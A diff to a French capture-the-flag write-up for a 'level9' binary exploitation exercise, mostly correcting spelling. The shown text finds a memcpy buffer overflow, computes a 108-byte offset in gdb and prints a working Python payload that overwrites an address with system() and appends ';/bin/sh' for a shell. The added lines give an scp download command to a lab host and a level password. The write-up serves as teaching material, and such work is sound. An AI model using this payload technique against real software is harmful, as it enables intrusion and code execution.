@@ -95,7 +95,7 @@ Non-debugging symbols:
 0x0804881c  _fini
 ```
 
-Apres analyse du fichier (\*\*source.c\*\*), on se rend compte que le programme appel la fonction **memcpy** que nous pourront exploit.
+Après analyse du fichier (**source.c**), on se rend compte que le programme appelle la fonction **memcpy** que nous pourront exploiter.
 On commence par trouver l'offset
 
 ```gdb
@@ -133,7 +133,7 @@ Breakpoint 3, 0x08048682 in main ()
 $3 = 98
 ```
 
-98 correspond à la valeur ascii de 'b', on a donc **overflow**à partir des 'b', nous avons donc passé 27 * 4 lettres, ce qui correspond a un **offset** de 108.
+98 correspond à la valeur ascii de 'b', on a donc **overflow**à partir des 'b', nous avons donc passé 27 * 4 lettres, ce qui correspond à un **offset** de 108.
 
 > OFFSET = 108
 
@@ -192,3 +192,7 @@ $1 = {<text variable, no debug info>} 0xb7d86060 <system>
 ```bash
 > ./level9 `python -c 'print "\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08;/bin/sh"'`
 ```
+
+For download :
+<pre><code>scp -P4242 level9@192.168.1.78:level9 .</code></pre>
+> Password : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
